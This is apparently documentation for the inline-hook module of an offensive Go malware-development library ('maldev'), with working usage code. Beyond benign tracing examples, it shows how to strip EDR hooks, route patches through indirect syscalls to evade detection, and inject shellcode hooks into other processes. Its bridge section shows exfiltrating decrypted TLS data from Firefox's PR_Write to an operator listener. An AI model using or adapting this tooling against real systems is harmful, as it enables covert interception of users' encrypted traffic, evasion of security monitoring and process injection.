---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# Inline Hook — x64 Function Interception

[<- Back to Evasion](README.md)

**MITRE ATT&CK:** [T1574.012](https://attack.mitre.org/techniques/T1574/012/) — Hijack Execution Flow: Inline Hooking
**Package:** `evasion/hook`
**Platform:** Windows (x64)
**Detection:** High

---

## Primer

Every Windows function — `MessageBoxW`, `CreateFileW`, `NtAllocateVirtualMemory`
— lives at some address in memory and starts with a short sequence of
instructions called its **prologue**. An *inline hook* rewrites the first
bytes of that prologue so the CPU jumps to **your** code instead. Your
callback inspects (or modifies) the arguments, then either lets the original
function run by calling a small *trampoline* that re-executes the patched
bytes and jumps back, or returns a synthetic result without ever running
the real function.

This single primitive underlies a huge fraction of both offensive and
defensive tooling:
- **EDR agents** hook `NtAllocateVirtualMemory` / `NtProtectVirtualMemory`
  in userland to flag shellcode-like allocations before they run.
- **Red-team tools** hook `AmsiScanBuffer` to make every scan return
  "clean", or `EtwEventWrite` to suppress telemetry.
- **Malware researchers** hook APIs they want to trace (args, return value)
  without attaching a debugger.

`evasion/hook` is a pure-Go, no-CGo, x64-only implementation: it allocates a
**relay page within ±2 GB** of the target (so a 5-byte `JMP rel32` is
enough), writes a JMP to the relay, and the relay hops to a Go callback via
`syscall.NewCallback`. An `Install/Uninstall` pair restores the original
bytes on demand.

---

## What It Does

Intercepts calls to any exported Windows function by patching its prologue
with a JMP to a Go callback. The original function remains callable via a
trampoline. Pure Go — no CGo, no x64dbg required.

## How It Works

```mermaid
sequenceDiagram
    participant Caller
    participant Target as "Target Function"
    participant Relay as "Relay Page within 2GB"
    participant Callback as "Go Callback"
    participant Trampoline as "Trampoline"

    Note over Target: Prologue patched with JMP rel32
    Caller->>Target: Call function
    Target->>Relay: JMP rel32 (5 bytes)
    Relay->>Callback: MOV R10, addr; JMP R10
    Callback->>Trampoline: syscall.SyscallN(h.Trampoline(), ...)
    Trampoline->>Target: Stolen bytes + JMP back past patch
    Target-->>Trampoline: Returns
    Trampoline-->>Callback: Returns
    Callback-->>Caller: Returns (possibly modified)
```

### Three Components

| Component | Size | Purpose |
|-----------|------|---------|
| **Hook patch** | 5 bytes (`E9 rel32`) | JMP from target to relay |
| **Relay page** | 13 bytes (`MOV R10, imm64; JMP R10`) | Absolute JMP to Go callback. Allocated within ±2GB of target (required for rel32). |
| **Trampoline** | N+13 bytes | Copy of stolen prologue bytes (with RIP fixups) + absolute JMP back to original function after the patch |

### Automatic Prologue Analysis

Uses `golang.org/x/arch/x86/x86asm` to:
1. Decode instructions until cumulative length >= 5 bytes
2. Detect RIP-relative instructions (`[RIP+disp32]`, relative branches)
3. Fix up displacements so the trampoline targets correct addresses

No manual `stealLength` calculation needed.

## API Reference

```go
func Install(targetAddr uintptr, handler interface{}) (*Hook, error)
func InstallByName(dllName, funcName string, handler interface{}) (*Hook, error)

type Hook struct{ ... }
func (h *Hook) Remove() error
func (h *Hook) Trampoline() uintptr
func (h *Hook) Target() uintptr
```

### `Install(targetAddr, handler) (*Hook, error)`

**Parameters:**
- `targetAddr` — absolute address of the Windows function to patch
  (resolve via `windows.NewLazyDLL("kernel32.dll").NewProc("DeleteFileW").Addr()`).
- `handler` — Go function whose signature matches the target. Use
  `interface{}` so callers don't pay the cost of typed-callback
  boilerplate; `syscall.NewCallback` synthesises the C-ABI thunk.

**Returns:** `*Hook` ready for `.Remove()` / `.Trampoline()`. Errors
on prologue-decode failure (RIP-relative jump in first 5 bytes that
can't be relocated), relay-allocation failure (no ±2 GB page
available), or write failure.

**Side effects:** mutates the first 5 bytes of `targetAddr` (saved
inside the Hook for restore), allocates two RX pages within ±2 GB of
the target.

### `InstallByName(dllName, funcName, handler)`

Convenience wrapper that resolves `dllName!funcName` via
`win/api.ResolveByHash` (string-free at runtime when called with
build-time constants) before calling `Install`.

### `Hook.Remove() / Hook.Trampoline() / Hook.Target()`

`Remove` restores the original 5 bytes and frees the relay/trampoline
pages. `Trampoline` returns the address callable from the handler to
invoke the original function (mandatory if you want pass-through).
`Target` returns the resolved target address (handy for logging).

## Usage

### Intercept and Log

```go
import (
    "log"
    "syscall"
    "unsafe"

    "github.com/oioio-space/maldev/evasion/hook"
    "golang.org/x/sys/windows"
)

var h *hook.Hook

func main() {
    var err error
    h, err = hook.InstallByName("kernel32.dll", "DeleteFileW",
        func(lpFileName uintptr) uintptr {
            name := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(lpFileName)))
            log.Printf("DeleteFileW: %s", name)
            r, _, _ := syscall.SyscallN(h.Trampoline(), lpFileName)
            return r
        },
    )
    if err != nil {
        log.Fatal(err)
    }
    defer h.Remove()

    // All DeleteFileW calls in this process now go through our handler.
    select {}
}
```

### Block an API Call

```go
var h *hook.Hook
h, _ = hook.InstallByName("kernel32.dll", "DeleteFileW",
    func(lpFileName uintptr) uintptr {
        return 0 // Return FALSE — deletion blocked
    },
)
defer h.Remove()
```

### Monitor NtCreateFile

```go
var h *hook.Hook
h, _ = hook.InstallByName("ntdll.dll", "NtCreateFile",
    func(fileHandle, desiredAccess, objAttrs, ioStatus, allocSize,
         fileAttrs, shareAccess, createDisp, createOpts, eaBuffer,
         eaLength uintptr) uintptr {
        log.Println("NtCreateFile intercepted")
        r, _, _ := syscall.SyscallN(h.Trampoline(),
            fileHandle, desiredAccess, objAttrs, ioStatus, allocSize,
            fileAttrs, shareAccess, createDisp, createOpts, eaBuffer, eaLength)
        return r
    },
)
defer h.Remove()
```

## How to Find the Right Function to Hook

You don't need x64dbg. Windows API functions are exported by name from
system DLLs — `InstallByName` resolves them automatically.

### Step 1: Identify the API

Ask: "What Windows API does the operation I want to intercept call?"

| I want to intercept... | Hook this function | In this DLL |
|------------------------|-------------------|-------------|
| File deletion | `DeleteFileW` | `kernel32.dll` |
| File creation/opening | `NtCreateFile` | `ntdll.dll` |
| Process creation | `CreateProcessW` | `kernel32.dll` |
| Registry writes | `RegSetValueExW` | `advapi32.dll` |
| Network connections | `connect` | `ws2_32.dll` |
| DNS resolution | `DnsQuery_W` | `dnsapi.dll` |
| MessageBox | `MessageBoxW` | `user32.dll` |
| Memory allocation | `NtAllocateVirtualMemory` | `ntdll.dll` |
| DLL loading | `LdrLoadDll` | `ntdll.dll` |
| Screenshot | `BitBlt` | `gdi32.dll` |

**Tip:** Hook the `Nt*` (ntdll) version to catch all callers — kernel32
functions like `CreateFileW` internally call `NtCreateFile`, so hooking
at the ntdll level catches both direct and indirect calls.

### Step 2: Find the Signature

Look up the function signature on [Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/).
Convert each parameter to `uintptr` in your Go handler:

```go
// MSDN signature:
// BOOL DeleteFileW(LPCWSTR lpFileName)
//
// Go handler:
func(lpFileName uintptr) uintptr

// MSDN signature:
// NTSTATUS NtCreateFile(
//   PHANDLE FileHandle,
//   ACCESS_MASK DesiredAccess,
//   POBJECT_ATTRIBUTES ObjectAttributes,
//   PIO_STATUS_BLOCK IoStatusBlock,
//   PLARGE_INTEGER AllocationSize,
//   ULONG FileAttributes,
//   ULONG ShareAccess,
//   ULONG CreateDisposition,
//   ULONG CreateOptions,
//   PVOID EaBuffer,
//   ULONG EaLength
// )
//
// Go handler: all pointers and integers become uintptr
func(fileHandle, desiredAccess, objAttrs, ioStatus, allocSize,
     fileAttrs, shareAccess, createDisp, createOpts, eaBuffer,
     eaLength uintptr) uintptr
```

### Step 3: Write the Hook

```go
package main

import (
    "fmt"
    "log"
    "os"
    "syscall"
    "unsafe"

    "github.com/oioio-space/maldev/evasion/hook"
    "golang.org/x/sys/windows"
)

var hDeleteFile *hook.Hook

func main() {
    var err error

    // Hook DeleteFileW — intercept all file deletions in this process.
    hDeleteFile, err = hook.InstallByName("kernel32.dll", "DeleteFileW",
        func(lpFileName uintptr) uintptr {
            name := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(lpFileName)))

            // Decide: block or allow?
            if name == `C:\important.txt` {
                log.Printf("BLOCKED deletion of %s", name)
                // Return FALSE — caller's GetLastError() will see whatever
                // is already in TEB (typically 0). Use windows.SetLastError
                // via direct syscall if you need a specific code.
                return 0
            }

            // Allow — call original via trampoline.
            log.Printf("ALLOWED deletion of %s", name)
            r, _, _ := syscall.SyscallN(hDeleteFile.Trampoline(), lpFileName)
            return r
        },
    )
    if err != nil {
        log.Fatal(err)
    }
    defer hDeleteFile.Remove()

    // Test it — try to delete a file.
    err = os.Remove(`C:\important.txt`)
    fmt.Printf("Remove result: %v\n", err) // Access denied — hook blocked it

    err = os.Remove(`C:\temp\disposable.txt`)
    fmt.Printf("Remove result: %v\n", err) // Allowed — hook called original
}
```

### Step 4: List All Exports

To discover what functions a DLL exports (without x64dbg), use `debug/pe`:

```go
import "debug/pe"

f, _ := pe.Open(`C:\Windows\System32\kernel32.dll`)
defer f.Close()

exports, _ := f.Exports()
for _, e := range exports {
    fmt.Println(e.Name)
}
// Output: AcquireSRWLockExclusive, AddAtomA, AddAtomW, ...
```

### Finding Signatures Without MSDN

The PE export table only stores `name → address` — **no parameter types or
count**. This is a fundamental limitation of the PE format. Several
approaches exist depending on the context:

#### For Windows APIs: just use MSDN

Microsoft documents every public function. Search
`site:learn.microsoft.com <function name>` and translate to `uintptr`.

#### For unknown/third-party functions: estimate parameter count

Since Go handlers use `uintptr` for all parameters, you only need to know
**how many** params — not their types. The x64 ABI is predictable:

- First 4 args: `RCX`, `RDX`, `R8`, `R9`
- Additional args: pushed on stack after 32-byte shadow space
- `sub rsp, 0xNN` in the prologue hints at the frame size

**Practical shortcut:** declare more parameters than the function actually
takes. Extra `uintptr` args are harmless — the Go callback ignores them:

```go
// Don't know exact param count? Declare the maximum (up to 18).
// Unused params are simply zero.
h, _ = hook.Install(funcAddr, func(
    a1, a2, a3, a4, a5, a6, a7, a8 uintptr,
) uintptr {
    log.Printf("called with: %x %x %x %x", a1, a2, a3, a4)
    r, _, _ := syscall.SyscallN(h.Trampoline(), a1, a2, a3, a4, a5, a6, a7, a8)
    return r
})
```

#### For programs with debug symbols (.pdb)

Microsoft publishes PDB files for system binaries on the
[Symbol Server](https://msdl.microsoft.com/download/symbols). Third-party
programs sometimes ship with `.pdb` files next to the `.exe`. PDB files
contain full type information including parameter names and types. Parsing
requires a PDB reader (not yet in maldev).

#### Discovering imports of a target program

To see which DLL functions a program calls (and thus which are hookable
via IAT), parse its import table:

```go
import "debug/pe"

f, _ := pe.Open(`C:\path\to\target.exe`)
defer f.Close()

imports, _ := f.ImportedSymbols()
for _, sym := range imports {
    fmt.Println(sym) // "kernel32.dll:CreateFileW", "ntdll.dll:NtClose", etc.
}
```

This tells you exactly which functions the target uses — you can then look
up each one's signature by name.

## Hook Options

`Install` and `InstallByName` accept variadic `HookOption` values:

| Option | Effect |
|--------|--------|
| `WithCaller(caller)` | Route the memory-patch syscall through a `*wsyscall.Caller` for indirect/direct syscall dispatch (EDR evasion) |
| `WithCleanFirst()` | Re-read the target function prologue from disk before patching, stripping any EDR hook already present |

```go
caller := wsyscall.New(wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()))

h, err := hook.InstallByName("ntdll.dll", "NtWriteFile", myHandler,
    hook.WithCaller(caller),   // use indirect syscalls for the patch
    hook.WithCleanFirst(),     // evict EDR hook first
)
```

Both options compose: `WithCleanFirst` strips the EDR hook via `unhook.ClassicUnhook`, then `WithCaller` writes the new patch through the indirect-syscall path.

---

## InstallProbe — Unknown Signatures

When you don't know a function's parameter types or count, use `InstallProbe`.
It hooks with a 18-`uintptr` handler, calls the original transparently, and
delivers a `ProbeResult` to your callback on every call.

```go
func Install​Probe(targetAddr uintptr, onCall func(ProbeResult), opts ...HookOption) (*Hook, error)
func Install​ProbeByName(dllName, funcName string, onCall func(ProbeResult), opts ...HookOption) (*Hook, error)
```

### ProbeResult

```go
type ProbeResult struct {
    Args [18]uintptr
    Ret  uintptr
}

func (r ProbeResult) NonZeroArgs() []int  // indices of non-zero args
func (r ProbeResult) NonZeroCount() int   // count of non-zero args
```

### Example: discover parameters of an unknown function

```go
h, err := hook.InstallProbeByName("somelib.dll", "UnknownFunc",
    func(r hook.ProbeResult) {
        log.Printf("called: %d non-zero args at indices %v",
            r.NonZeroCount(), r.NonZeroArgs())
        // Inspect r.Args[0], r.Args[1], ... to understand the ABI.
    },
)
if err != nil {
    log.Fatal(err)
}
defer h.Remove()
```

Call the target binary and observe which argument slots light up. Once you
have a count, switch to a typed `Install` handler.

---

## HookGroup — Multi-Hook

`HookGroup` installs a set of hooks atomically: if any installation fails,
all previously installed hooks in the group are removed before the error is
returned, so the process never ends up in a half-hooked state.

```go
func InstallAll(targets []Target, opts ...HookOption) (*HookGroup, error)

type Target struct {
    DLL     string
    Func    string
    Handler interface{}
}

func (g *HookGroup) RemoveAll() error
func (g *HookGroup) Hooks() []*Hook
```

### Example: hook all Winsock send/recv at once

```go
var (
    hSend *hook.Hook
    hRecv *hook.Hook
)

g, err := hook.InstallAll([]hook.Target{
    {DLL: "ws2_32.dll", Func: "send",
        Handler: func(s, buf, len, flags uintptr) uintptr {
            log.Printf("send: %d bytes", len)
            r, _, _ := syscall.SyscallN(hSend.Trampoline(), s, buf, len, flags)
            return r
        },
    },
    {DLL: "ws2_32.dll", Func: "recv",
        Handler: func(s, buf, len, flags uintptr) uintptr {
            log.Printf("recv: %d bytes", len)
            r, _, _ := syscall.SyscallN(hRecv.Trampoline(), s, buf, len, flags)
            return r
        },
    },
})
if err != nil {
    log.Fatal(err) // both hooks rolled back on any failure
}
// Populate trampoline references after group install.
hSend = g.Hooks()[0]
hRecv = g.Hooks()[1]
defer g.RemoveAll()
```

---

## PE Import Analysis

`pe/imports` enumerates the IAT (Import Address Table) of any PE on disk —
no process access required. Use it to discover which functions a target
binary imports so you know what to hook.

```go
// List every import in an executable.
func List(pePath string) ([]Import, error)

// Filter to a single DLL.
func ListByDLL(pePath, dllName string) ([]Import, error)

// Parse from an io.ReaderAt (e.g. in-memory PE).
func FromReader(r io.ReaderAt) ([]Import, error)

type Import struct {
    DLL      string
    Function string
}
```

### Example: find hookable network functions in a target

```go
import "github.com/oioio-space/maldev/pe/imports"

imps, err := imports.ListByDLL(`C:\Program Files\target\app.exe`, "ws2_32.dll")
if err != nil {
    log.Fatal(err)
}
for _, imp := range imps {
    fmt.Printf("%s!%s\n", imp.DLL, imp.Function)
}
// ws2_32.dll!connect
// ws2_32.dll!send
// ws2_32.dll!recv
// ws2_32.dll!WSASend
```

---

## Remote Hooking

`RemoteInstall` injects a shellcode hook handler into another process. The
patching itself happens inside the target process (the shellcode is
responsible for installing the hook once loaded). Compose with `GoHandler`
to turn a Go hook DLL into position-independent shellcode via Donut.

```go
// Inject shellcode handler into a process by PID.
func RemoteInstall(pid uint32, dllName, funcName string, shellcodeHandler []byte, opts ...RemoteOption) error

// Resolve process name to PID, then call RemoteInstall.
func RemoteInstallByName(processName, dllName, funcName string, shellcodeHandler []byte, opts ...RemoteOption) error

// Convert a Go hook DLL on disk to PIC shellcode.
func GoHandler(dllPath, entryPoint string) ([]byte, error)

// Convert a Go hook DLL already loaded in memory to PIC shellcode.
func GoHandlerBytes(dllBytes []byte, entryPoint string) ([]byte, error)

// Override the injection method (default: CreateRemoteThread).
func WithMethod(m inject.Method) RemoteOption
```

All 15+ injection methods from `inject/` are available via `WithMethod`.

### Example workflow: hook `PR_Write` in Firefox

```go
// 1. Build the hook DLL (go build -buildmode=c-shared -o hook.dll ./hookcmd)
sc, err := hook.GoHandler(`hook.dll`, "InstallHook")
if err != nil {
    log.Fatal(err)
}

// 2. Inject into the running process using a stealthy method.
err = hook.RemoteInstallByName("firefox.exe", "nss3.dll", "PR_Write", sc,
    hook.WithMethod(inject.MethodEarlyBirdAPC),
)
if err != nil {
    log.Fatal(err)
}
// Firefox's TLS layer (nss3.dll!PR_Write) is now intercepted.
```

---

## Shellcode Templates

`evasion/hook/shellcode` provides tiny x64 stubs for use with `RemoteInstall`
when you want a pre-canned behaviour without writing a full hook DLL.

```go
// Block() — always returns 0 (FALSE). 3 bytes: XOR EAX,EAX; RET
func Block() []byte

// Nop(addr) — calls original function unchanged via JMP to trampoline. 13 bytes.
func Nop(trampolineAddr uintptr) []byte

// Replace(val) — returns a fixed value. 11 bytes: MOV RAX,imm64; RET
func Replace(returnValue uintptr) []byte

// Redirect(addr) — unconditional JMP to another address. 13 bytes.
func Redirect(targetAddr uintptr) []byte
```

### Example: silently block a single API in a remote process

```go
import "github.com/oioio-space/maldev/evasion/hook/shellcode"

// Block all CreateFile calls in notepad.exe — returns 0 with no side-effects.
err := hook.RemoteInstallByName("notepad.exe", "kernel32.dll", "CreateFileW",
    shellcode.Block(),
)
```

---

## Bridge Control API

The `evasion/hook/bridge` package provides a bidirectional IPC channel between
a hook handler running inside a target process and an operator listener outside
(or in a separate goroutine).

### Modes

| Mode | How | When to use |
|------|-----|-------------|
| **Standalone** | `bridge.Standalone()` | Hook runs autonomously — all `Ask` calls return `Allow` automatically |
| **Connected** | `bridge.Connect(conn)` | Hook sends events to a live listener for real-time decisions |

### Controller (hook handler side)

```go
// Standalone — no comms, all decisions auto-allow.
c := bridge.Standalone()

// Connected — bidirectional channel to a Listener.
c := bridge.Connect(conn)

// Send a tagged call for approval; blocks until listener replies.
// Returns Allow on any transport error (fail-open).
decision := c.Ask("tag", data) // returns Allow | Block | Modify

// Send a free-form log message to the listener.
c.Log("format %s", value)

// Exfiltrate tagged binary data to the listener.
c.Exfil("tag", data)

// Call the original function via trampoline.
ret := c.CallOriginal(args...)
```

Decisions:

```go
bridge.Allow  // pass through to original
bridge.Block  // suppress the call
bridge.Modify // caller adjusts args/return before forwarding
```

### Listener (operator side)

```go
conn, _ := bridge.DialTCP("127.0.0.1:9000", 5*time.Second)
l := bridge.NewListener(conn)

l.OnCall(func(c bridge.Call) bridge.Decision {
    log.Printf("[%s] %x", c.Tag, c.Data)
    return bridge.Allow
})
l.OnExfil(func(tag string, data []byte) {
    log.Printf("exfil[%s]: %d bytes", tag, len(data))
})
l.OnLog(func(msg string) { log.Println(msg) })

go l.Serve() // blocks until connection closed
defer l.Close()
```

### Transport

```go
// Named pipe (Windows — low footprint, no network traffic).
conn, err := bridge.DialPipe(`\\.\pipe\hookbridge`, 5*time.Second)

// TCP (cross-host or cross-process).
conn, err := bridge.DialTCP("127.0.0.1:9000", 5*time.Second)
```

### Example: TLS interception via PR_Write hook

```go
// --- implant side (inside target process, hook DLL) ---
c := bridge.Connect(conn)

hook.InstallByName("nss3.dll", "PR_Write",
    func(fd, buf, amount uintptr) uintptr {
        data := unsafe.Slice((*byte)(unsafe.Pointer(buf)), amount)
        c.Exfil("pr_write", data)                     // send plaintext to operator
        d := c.Ask("pr_write_allow", data)             // ask for approval
        if d == bridge.Block {
            return 0
        }
        r, _, _ := syscall.SyscallN(h.Trampoline(), fd, buf, amount)
        return r
    },
)

// --- operator side (separate process) ---
conn, _ := bridge.DialTCP("127.0.0.1:9000", 5*time.Second)
l := bridge.NewListener(conn)
l.OnExfil(func(tag string, data []byte) {
    fmt.Printf("[TLS plaintext] %s\n", data)
})
l.OnCall(func(c bridge.Call) bridge.Decision {
    return bridge.Allow // let all writes through
})
go l.Serve()
```

---

## Advantages & Limitations

| Aspect | Detail |
|--------|--------|
| **Pure Go** | No CGo — uses `syscall.NewCallback` |
| **Auto analysis** | Prologue decoded via `x86asm` |
| **RIP fixup** | RIP-relative instructions patched in trampoline |
| **Trampoline** | Original function remains callable |
| **Max params** | ~18 uintptr parameters (NewCallback limit) |
| **Scope** | Current process only (use `RemoteInstall` for other processes) |
| **Thread safety** | Brief race window during patch (non-atomic write) |
| **Go runtime** | Don't hook NtClose, NtCreateFile, NtReadFile, NtWriteFile |
| **WithCaller** | Routes memory-patch through indirect/direct syscalls to evade EDR write monitors |
| **WithCleanFirst** | Strips existing EDR hook from disk image before installing yours |
| **InstallProbe** | Signature-agnostic probe; captures all 18 arg slots, zero overhead on unknown ABIs |
| **HookGroup** | Atomic multi-hook install with rollback — no partial state on failure |
| **RemoteInstall** | Injects hook handler into another process via any of 15+ injection methods |
| **GoHandler** | Converts Go hook DLL to PIC shellcode via Donut (no separate toolchain needed) |
| **shellcode templates** | `Block` / `Nop` / `Replace` / `Redirect` — tiny PIC stubs for remote hooks |
| **Bridge (standalone)** | Autonomous hook with no comms; `Ask` always returns `Allow` |
| **Bridge (connected)** | Real-time operator control over allow/block/modify decisions via named pipe or TCP |

## Comparison with evasion/unhook

| | `evasion/hook` | `evasion/unhook` |
|---|---|---|
| **Direction** | Installs hooks (intercept) | Removes hooks (restore) |
| **Use case** | API monitoring, redirection | EDR bypass |
| **Complementary** | Unhook EDR first, then install your own hooks |

## MITRE ATT&CK

| Technique | ID |
|-----------|-----|
| Hijack Execution Flow: Inline Hooking | [T1574.012](https://attack.mitre.org/techniques/T1574/012/) |

## Detection

**High** — Any integrity check comparing in-memory function prologues to
their on-disk counterparts will detect the JMP patch. EDR products
specifically monitor for this on sensitive functions.

## See also

- [Evasion area README](README.md)
- [`evasion/hook/bridge`](inline-hook.md) — companion IPC controller for runtime hook swap
- [`evasion/hook/shellcode`](inline-hook.md) — pre-fab x64 handler payloads
- [`evasion/unhook`](ntdll-unhooking.md) — symmetric primitive: remove EDR-installed hooks before installing your own
